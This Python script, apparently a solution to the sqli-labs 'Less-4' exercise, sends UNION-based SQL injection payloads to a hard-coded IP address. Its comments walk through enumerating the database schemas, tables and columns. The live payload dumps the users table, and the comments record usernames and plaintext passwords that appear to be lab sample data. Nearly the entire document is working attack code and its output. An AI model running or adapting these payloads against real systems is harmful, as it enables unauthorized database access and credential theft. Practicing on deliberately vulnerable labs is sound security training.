import requests

# payload = '-1\")UNION SELECT 1,2,3 %23' => Your Login name:2<br>Your Password:3
# payload = '-1\")UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA %23'
# => information_schema,challenges,mysql,performance_schema,security
# payload = '-1\")UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() %23'
# => emails,referers,uagents,users
# payload = "-1\")UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' %23"
# => id,username,password
payload = "-1\")UNION SELECT 1,2,GROUP_CONCAT(id,username,password) FROM users %23"
# => 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4
url = 'http://129.211.79.54:8801/Less-4/?id=' + payload
r = requests.get(url)
print(r.text)
print(r.url)
